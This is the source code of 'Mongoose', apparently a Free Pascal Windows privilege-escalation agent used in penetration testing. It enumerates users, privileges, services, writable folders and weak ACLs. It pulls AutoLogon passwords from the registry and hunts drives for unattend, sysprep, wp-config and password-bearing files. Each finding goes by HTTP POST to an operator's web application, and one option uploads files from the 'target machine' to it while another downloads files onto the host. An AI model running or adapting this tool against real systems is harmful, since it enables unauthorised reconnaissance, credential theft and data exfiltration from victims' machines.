{

   

/'\_/`\
|     |   _     ___     __     _      _     ___    __
| (_) | /'_`\ /' _ `\ /'_ `\ /'_`\  /'_`\ /',__) /'__`\
| | | |( (_) )| ( ) |( (_) |( (_) )( (_) )\__, \(  ___/
(_) (_)`\___/'(_) (_)`\__  |`\___/'`\___/'(____/`\____)
                     ( )_) |
                      \___/'

 * Source is provided to this software because we believe users have a     *
 * right to know exactly what a program is going to do before they run it. *
 * This also allows you to audit the software for security holes.          *
 *                                                                         *
 * Source code also allows you to port Mongoose to new platforms, fix bugs *
 * and add new features.  You are highly encouraged to send your changes   *
 * to the security@secploit.com                                            *
 * Mongoose Toolkit will always be available Open Source.                  *
 *                                                                         *
 *                                                                         *
 *  This program is distributed in the hope that it will be useful,        *
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of         *
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                   *
 *                                                                         *
 *  #Author : Lawrence Amer   @zux0x3a
 *  #LINKS : https://secploit.com , https://0xsp.com
 *                                                                         *
}
program agent;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils, CustApp,windows,process,JwaWinSvc,services,strutils,FileUtil,core;

const
   // users privielges levels
 SECURITY_NT_AUTHORITY: TSIDIdentifierAuthority = (Value: (0, 0, 0, 0, 0, 5));
 SECURITY_BUILTIN_DOMAIN_RID = $00000020;
 DOMAIN_ALIAS_RID_ADMINS     = $00000220;
 DOMAIN_ALIAS_RID_USERS      = $00000221;
 DOMAIN_ALIAS_RID_GUESTS     = $00000222;
 DOMAIN_ALIAS_RID_POWER_USERS= $00000223;
 //
 // Windows Service Types
 //
 SERVICE_KERNEL_DRIVER       = $00000001;
 SERVICE_FILE_SYSTEM_DRIVER  = $00000002;
 SERVICE_ADAPTER             = $00000004;
 SERVICE_RECOGNIZER_DRIVER   = $00000008;

 SERVICE_DRIVER              =
   (SERVICE_KERNEL_DRIVER or
    SERVICE_FILE_SYSTEM_DRIVER or
    SERVICE_RECOGNIZER_DRIVER);

 SERVICE_WIN32_OWN_PROCESS   = $00000010;
 SERVICE_WIN32_SHARE_PROCESS = $00000020;
 SERVICE_WIN32               =
   (SERVICE_WIN32_OWN_PROCESS or
    SERVICE_WIN32_SHARE_PROCESS);

 SERVICE_INTERACTIVE_PROCESS = $00000100;

 SERVICE_TYPE_ALL            =
   (SERVICE_WIN32 or
    SERVICE_ADAPTER or
    SERVICE_DRIVER  or
    SERVICE_INTERACTIVE_PROCESS);
const
  BUF_SIZE = 2048; // Buffer size for reading the output in chunks

type

  { Tmongoose }

  Tmongoose = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
    procedure acl; virtual;
    procedure userinfo; virtual;           // Get Windows Machine user information
    procedure servicesenum; virtual;       //Enumerate All types of Windows Services & Drivers
    procedure banner;virtual;
    procedure systeminfo;virtual;       // Retrieving System information
    procedure programs;virtual;         // Enumerate All installed softwares  on the machine
    procedure networking;virtual;       // Display All Networks information
    procedure potentialfiles;virtual;  // Search Whole System for Specific Senstive Files , Configs ..etc
    procedure passstring;virtual;     // Search in files on drive for a specific keyword
    procedure download;virtual;      //  Download files directly into windows machine
    procedure exploits;virtual;    // enumerate for hotfixes , local exploits
    procedure transferfiles;virtual;

  end;
   var
     runitout:string;
{ Tmongoose }

procedure Tmongoose.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h', 'help') then begin
    WriteHelp;
    Terminate;
    Exit;
  end;
  if Hasoption('s','services') then begin
   servicesenum;
  //wmic;
  end;
  if Hasoption('u','user info') then begin
    userinfo;
  end;
  if HasOption('i','system info') then begin
     systeminfo;
    end;
  if HasOption('p','programs') then begin
     programs;
     end;
  if HasOption('n','netowkring') then begin
     networking;
  end;
  if HasOption('c','configs') then begin
     potentialfiles;
     end;
  if HasOption('l','look') then begin
    passstring;
     end;
  if hasoption('d','downloadfile') then begin
    download;
    end;
  if hasOption('e','exploits') then begin
    exploits
    end;
  if hasoption('w','acl') then begin
    acl;
    end;
  if hasoption('t','tarnsfer') then begin
    transferfiles;
   end;
  if hasoption('m','mongoose') then begin
     systeminfo;
     userinfo;
     networking;
     servicesenum;
     programs;
     potentialfiles;
     exploits;
     acl;
    end;
    { add your program here }
    banner;




  // stop program loop
  Terminate;
end;


procedure Tmongoose.transferfiles;
var
 api,filen:string;
 i :integer;

begin
 for i := 0 to paramcount do begin
  if (paramstr(i)='-t') then begin
     filen :=paramstr(i+1);
     api :=paramstr(i+2);
  end;
  end;
  Writeln('[i] Make Sure Correct Usage as : agent.exe -t API SECRET');
  writeln('[*] You are uploading ',filen +' Into '+api);
uploadfile(filen,api);
end;

procedure Tmongoose.exploits;
var
  vr,build,res:string;
  list:tstringlist;
begin
 exploitinspection;
 end;
procedure Tmongoose.download;
var
  i :integer;
  url,filename :string;
begin
 for i := 1 to paramcount do begin
 if (paramstr(i)='-d') then begin
   url := paramstr(i+1);
   filename := paramstr(i+2);
 end;
end;
 downloadfile(url,filename);  //download file from internet. any format

end;

procedure Tmongoose.passstring;
var
  s,drv,ext:string;
  i :integer;
begin
  //agent.exe -l C:\ String *.txt -o IP -x Secret Key

 for i := 1 to paramcount do begin
  if (paramstr(i)='-l') then begin
    drv := paramstr(i+1);
    s:=paramstr(i+2);
    ext := paramstr(i+3);
  end;
  end;
  findastring(drv,ext,s,true); // this will keep searching Driver for specific string

 end;



procedure Tmongoose.potentialfiles;
var
  cfg,conf,cnf,config,sysprep,unattended,sysprepinf,unattend,vnc,wp,ip,os,drv: String;
  AList,Pathlist,outres,dv: TStringList;
  i,p,u,d: Integer;
begin


  AList := TStringList.Create;
  PathList := TstringList.create;
  outres := Tstringlist.create;
  // drv:= Tstringlist.Create;
  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os
  GetDriveLetters(pathlist);

  try
    writeln('[+] Searching for Potential Files...it takes a While  ');
    cfg := '*.cfg';
   conf:='*.conf';
    cnf :='*.cnf';
   config :='*.config';
    sysprep :='sysprep.xml';
    unattended:='unattended.xml';
    unattend:='unattend.xml';
    sysprepinf :='sysprep.inf';
   vnc:='*.vnc';
    wp:='wp-config';
     //end;
    Alist.Add(cfg);
    Alist.Add(conf);
    Alist.Add(cnf);
   Alist.Add(config);
    Alist.Add(sysprep);
    Alist.Add(unattended);
    Alist.Add(unattend);
  Alist.Add(sysprepinf);
   Alist.Add(vnc);
   Alist.Add(wp);

    for p:=0 to pathlist.Count -1 do begin
    writeln('[+] Searching IN ',pathlist[p]);
    pathlist.Sorted:=true;
    pathlist.Duplicates:=dupIgnore;

    for i:=0 to Alist.Count -1 do
    begin
      writeln('[*] Searching For .',Alist[i]);
     Alist.Sorted:=true;
     Alist.Duplicates:=dupIgnore;
    FindAllFiles(outres, pathlist[p], Alist[i], True, faDirectory);
     end;
    //this will sort data as expected

    for i := 0 to outres.Count - 1 do begin
      outres.Sorted:=true;
      outres.Duplicates:=dupIgnore;
      writeln(outres.Strings[i]);
      postRequest('<font color="lightgreen"><b>[*] Possible Potential Files </b></font>'+outres.Strings[i],ip,os,'16');         //cat number 6 information collected
    end;

    end;
  finally
    pathlist.free;
    AList.Free;
    outres.free;
  end;


  end;
  //end;
procedure Tmongoose.networking;
var

ipcon,arp,netstat,ip,os,cat:string;
begin
 ip :=getlocalip;     //retrieve host ip address for all unix system
os := osver;     //retrieve operating system  os

ipcon := runit('ipconfig /all');
arp := runit('arp -a');
netstat := runit('netstat -ano');
writeln('[+] Network information ',ipcon);
 postRequest('<font color="red"><b>[*] Network information</b></font>'+ipcon,ip,os,'14');
writeln('--------------------------------------');
writeln(arp);
 postRequest('[*] ARP '+arp,ip,os,'14');
writeln('[+] Machine Active Connection ',netstat);
postRequest('<font color="green"><b>[*] Machine Active Connection</b></font> '+netstat,ip,os,'14');
writeln('Reading the contents of file: WINDOWS HOST FILE');
writeln('=========================================');
catfile('hosts',systemfolder+'\drivers\etc\');

end;

procedure Tmongoose.programs;
var
  outa,outx86,proc:string;
  os,ip:string;
begin
   ip :=getlocalip;     //retrieve host ip address for all unix system
   os := osver;     //retrieve operating system  os

  writeln('[+] Software installed ');

  outa := runit('dir /a "C:\Program Files"');
  outx86 := runit('dir /a "C:\Program Files (x86)"');
  writeln('[+] Installed Softwares',outa);
  postRequest('<font color="red"><b>[*] Installed Softwares</b></font> '+outa,ip,os,'11');
  writeln('[+] Installed x86 Softwares',outx86);
  postRequest('[*] Installed x86 Software'+outx86,ip,os,'11');
  proc := runit('tasklist /svc');
  writeln('[+] Running Processes ',proc);
  postRequest('<font color="lightgreen"><b>[*]Running Processes</b></font> '+proc,ip,os,'11');

end;

procedure Tmongoose.systeminfo;
var
  outa1,outa2,outa3,elevated,os,ip: string;
  i:integer;
begin
  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os

  outa1 := runit('systeminfo');
  writeln('[+] System information ',outa1);
    postRequest('<font color="red"><b>[*] System information </b></font> '+outa1,ip,os,'9');
  writeln('[+] Other logged into Machine :: ');
  outa2 := runit('qwinsta');
  writeln(outa2);
   postRequest('[*] Other logged into Machine '+outa2,ip,os,'9');
  writeln('[+] User AutoLogon Key if Any .');
  outa3 := runit('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"');
  writeln(outa3);
   postRequest(' <font color="lightgreen"><b>[*] User AutoLogon Key if Any </b></font>'+outa3,ip,os,'9');
  elevated := runit('reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated');
  i := pos('ERROR',elevated);

  if i > 0 then begin
     writeln('[+] Always installed Elevated is { Disabled | Not Vulnerable } ');
      postRequest(' <font color="lightgreen"><b>[*] Always installed Elevated is { Disabled | Not Vulnerable } </b></font> ',ip,os,'9');
     end else if i < 0 then
     writeln('[+] Mongoose think it is vulnerable to [AlwaysInstalledElevated] ! ',elevated);
      postRequest(' <font color="red"><b>[*] Mongoose think it is vulnerable to [AlwaysInstalledElevated] ! </b></font> ',ip,os,'9');
  end;

procedure Tmongoose.banner;
var
  outp,id,ip,os:string;
  result,res : integer;
   process:Tprocess;
   list:Tstringlist;
   da,rotten,po:string;
begin
  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os

  po :=' No ! ';
  writeln('================================================='+
  #013#010'[+] 0xsp Mongoose Windows  Escalation Toolkit [V1.7] '#013#010'[+] Coded By : Lawrence Amer(@zux0x3a) '#013#010'[+] Site: https://0xsp.com'#013#010'[+] Arch: Windows (x86_x64)'+
    #013#010'================================================='
  );
  list := Tstringlist.Create;
  RunCommand(systemfolder+'\cmd.exe',['/c','whoami'],id);
  da:= powershell('Get-ExecutionPolicy ;stop-process -Id $PID');
  rotten :=runit('whoami /priv |findstr "SeImpersonatePrivilege seAssignPrimaryPrivilege SeDebugPrivilege SeLoadDriverPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeTakeOwnershipPrivilege "');
  res := pos('Enabled',rotten);  //looking if one of above are enabled
  if res > 0 then
  begin
     po :='';
     po :=' YES , Vulnerable';
     postrequest(' <font color="red"><b>[*] Appears to be vulnerable with Rotten Potato [https://github.com/foxglovesec/RottenPotato] </b></font>',ip,os,'12');
  end;
  result := CompareStr(da,'Restricted');
  if result = 2 then begin

  Writeln('[+] PowerShell Status : ',da);

 end else if result = 3 then begin
  Writeln('[+] PowerShell Status : ',da);
 end;
  Writeln('[+] is it vulnerable to Rotten Potato ?',po);
  Writeln('[+] Current System Path : ',systemfolder);
  Writeln('[+] Current User  : ',id);
  writeln('[+] Windows OS : ',osver);
 end;
// end;

procedure Tmongoose.servicesenum;
var
  SERVICE_WIN32L:Tstringlist;
  SERVICE_ADAPTERL:Tstringlist;
  SERVICE_DRIVERL:Tstringlist;
  SERVICE_INTERACTIVE_PROCESSL:Tstringlist;
   ip,os:string;
begin
  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os

  Writeln('[+] Active Running Windows Services & Drivers  ');
  writeln('-------------------------------------');
  SERVICE_WIN32L := Tstringlist.Create;
  SERVICE_ADAPTERL := Tstringlist.Create;
  SERVICE_DRIVERL := Tstringlist.Create;
  SERVICE_INTERACTIVE_PROCESSL := Tstringlist.Create;


  ServiceGetList('',SERVICE_WIN32, SERVICE_ACTIVE,SERVICE_WIN32L);
  writeln('[+] Active Win32 Services ');

  writeln(SERVICE_WIN32L.Text);
   postRequest(' <font color="lightgreen"><b>[*] Active Win32 Services </b></font> '+SERVICE_WIN32L.Text,ip,os,'10');
  ServiceGetList('',SERVICE_ADAPTER, SERVICE_ACTIVE,SERVICE_ADAPTERL);
  writeln('[+] Active Adapter Services ');

  writeln(SERVICE_ADAPTERL.Text);
  postRequest(' <font color="lightgreen"><b>[*] Active Adapter Services </b></font>'+SERVICE_ADAPTERL.Text,ip,os,'10');
  ServiceGetList('',SERVICE_DRIVER, SERVICE_ACTIVE,SERVICE_DRIVERL);
  writeln('[+] Active Driver Services ');

  writeln(SERVICE_DRIVERL.Text);
  postRequest(' <font color="lightgreen"><b>[*] Active Driver Services </b></font> '+SERVICE_DRIVERL.Text,ip,os,'10');
  ServiceGetList('',SERVICE_INTERACTIVE_PROCESS, SERVICE_ACTIVE,SERVICE_INTERACTIVE_PROCESSL);
  writeln('[+] Active Interactive Process Services ');

  writeln(SERVICE_INTERACTIVE_PROCESSL.Text);
   postRequest(' <font color="lightgreen"><b>[*] Active Interactive Process Services </b></font>'+SERVICE_INTERACTIVE_PROCESSL.Text,ip,os,'10');
  //Freeing Tstringlist
  SERVICE_WIN32L.Free;
  SERVICE_ADAPTERL.free;
  SERVICE_DRIVERL.free;
  SERVICE_INTERACTIVE_PROCESSL.free;

 end;

procedure Tmongoose.userinfo;
var
    process : Tprocess;
    i:integer;
    cmd,cmd2,cmd3,output,outap: string;
    list,outp : Tstringlist;
    OutputStream : TStream;
    BytesRead    : longint;
    key,key2 : string;
    Buffer       : array[1..BUF_SIZE] of byte;
    ip,os:string;
begin

  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os


 Writeln('[+]  Check User Group Level ');
 Writeln(Format('Current user is Admin !       %s',[BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_ADMINS),True)]));
 Writeln(Format('Current user is Guest  !      %s',[BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_GUESTS),True)]));
 Writeln(Format('Current user is Power User !   %s',[BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_POWER_USERS),True)]));
  postRequest('[*] Current user is Admin !? '+BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_ADMINS)),ip,os,'13');
  postRequest('[*] Current user is Guest !? '+BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_GUESTS)),ip,os,'13');
  postRequest('[*] Current user is Power User !? '+BoolToStr(UserInGroup(DOMAIN_ALIAS_RID_POWER_USERS)),ip,os,'13');
  cmd  := 'net user';
   cmd2 := 'whoami /priv';

   list := Tstringlist.Create;
   outp := Tstringlist.Create;

   list.Add(cmd);
   list.Add(cmd2);

   process := Tprocess.Create(nil);
   OutputStream := TMemoryStream.Create;    // we are going to store outputs as memory stream .
   process.Executable:=systemfolder+'\cmd.exe';
   process.Options:= [poUsePipes,poStderrToOutPut];
   for i:=0 to list.Count-1 do begin
   try
   process.CommandLine:=list[i];
   process.Execute;
   except
   on E: exception do
    writeln(E.Message);
      end;
   repeat
    // Get the new data from the process to a maximum of the buffer size that was allocated.
    // Note that all read(...) calls will block except for the last one, which returns 0 (zero).
      BytesRead := Process.Output.Read(Buffer, BUF_SIZE);
      OutputStream.Write(Buffer, BytesRead)
    until BytesRead = 0;    //stop if no more data is being recieved
    outputstream.Position:=0;
    outp.LoadFromStream(outputstream);
    end;
      writeln('[+] Current System Users With Privileges   : ',outp.Text);
       postRequest(' <font color="red"><b>[*] Current System Users With Privileges </b></font>'+outp.Text,ip,os,'13');

      writeln('[+] Net Local Users and Groups overview ');
      outap :=runit('net localgroup');
      writeln(outap);
      postRequest(' <font color="lightgreen"><b> [*] Net Local Users and Groups overview </b></font>'+outap,ip,os,'13');
   // end;
    process.free;
    list.Free;
    outp.Free;
// end;
  // end;
  end;
 procedure Tmongoose.acl;
 var
  res:boolean;
  outres : Tstringlist;
  path ,f,m,ff,mm,fff,ffff,mmm,mmmm,os,ip: string;
  i :integer;
begin
  ip :=getlocalip;     //retrieve host ip address for all unix system
  os := osver;     //retrieve operating system  os

   f := runit('icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"');
   ff := runit('icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"');
   fff := runit('icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" ');
   ffff:= runit('icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"');

   mm :=runit('icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"');
   mmm:=runit('icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"');
   mmmm :=runit('icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"');
   m := runit('icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"');


   Writeln('[+] Full Permission for Every One Level > ',f,ff);
   postRequest('[*] Full Permission for Every One Level > '+f,ip,os,'15');
    postRequest('[*] Full Permission for Every One Level > '+ff,ip,os,'15');
   writeln('===========================================');
   writeln('[+]Full Permission For BUILTIN\Users Level > ',fff,ffff);
    postRequest('[*] Full Permission for BUILTIN\Users Level > '+fff,ip,os,'15');
     postRequest('[*] Full Permission for BUILTIN\Users Level > '+ffff,ip,os,'15');
   writeln('===========================================');
   writeln('[+] Modify Permission For EveryOne Level > ',mm,mmm);
   postRequest('[*] Modify Permission For EveryOne Level > '+mm,ip,os,'15');
    postRequest('[*] Modify Permission For EveryOne Level > '+mmm,ip,os,'15');
   writeln('===========================================');
   Writeln('[+] Modify Permission For BUILTIN\Users > ',m,mmmm);
    postRequest('[*] Modify Permission For BUILTIN\Users Level > '+m,ip,os,'15');
     postRequest('[*] Modify Permission For BUILTIN\Users Level > '+mmmm,ip,os,'15');
   writeln('===========================================');


  Writeln('[+] Executing Access Check For Writable Folders With Current Level..... ');
  path :='C:\';
  outres:= Tstringlist.Create;
   try
  FindAllDirectories(outres,path,True);
  for i := 0 to outres.Count -1 do begin

  res := WritableDir(outres.strings[i]);
  if (res = true) then begin
    writeln(outres.Strings[i]);
   postRequest(' <font color="lightgreen"><b>[*] Access Check For Writable Folders With Current Level > </b></font>'+outres.Strings[i],ip,os,'15');

end;
  end;
    except
   on E: exception do
    writeln('[i] Some of Locations flaged as :',E.Message);
      end;
   end;


constructor Tmongoose.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor Tmongoose.Destroy;
begin
  inherited Destroy;
end;

procedure Tmongoose.WriteHelp;
begin
  { add your help code here }
  writeln('Usage: ', ExeName, ' -h');
  Writeln('[!] ------------------------------------------------------------------');
  writeln('-s',' --Enumerate Active Windows Services , Drivers  ..etc .   ');
  writeln('-u',' --Getting information about Users , groups , Roles , Releated information . ');
  writeln('-c',' --Search for Senstive Config files Accessible & Private stuff . ');
  writeln('-n',' --Retrieve Network information,interfaces ...etc .');
  writeln('-w',' --Enumerate for Writeable Directories , Access Permission Check , Modified Permissions.  ');
  writeln('-i',' --Enumerate Windows System information , Sessions , Releated information.');
  writeln('-l',' --Search in Any File by Specific Keywork , ex : agent.exe -l c:\ password *.config. ');
  writeln('-o',' --Connect to 0xsp Mongoose Web Application API. ');
  writeln('-p',' --Enumerate installed Softwares , Running Processes, Tasks .  ');
  Writeln('-e',' --Kernel inspection Tool, it will help to search through tool databases for windows kernel vulnerabilities ');
  writeln('-x',' --Secret Key to authorize your connection with WebApp. ');
  Writeln('-d',' --Download Files directly into Target Machine . ');
  Writeln('-t',' --Upload Files From Target Machine into Mongoose Web Application API.');
  Writeln('-m',' --Run All Known Scan Types together .');
end;

var
  Application: Tmongoose;
begin
  Application:=Tmongoose.Create(nil);
  Application.Title:='Mongoose';
  Application.Run;
  Application.Free;
end.

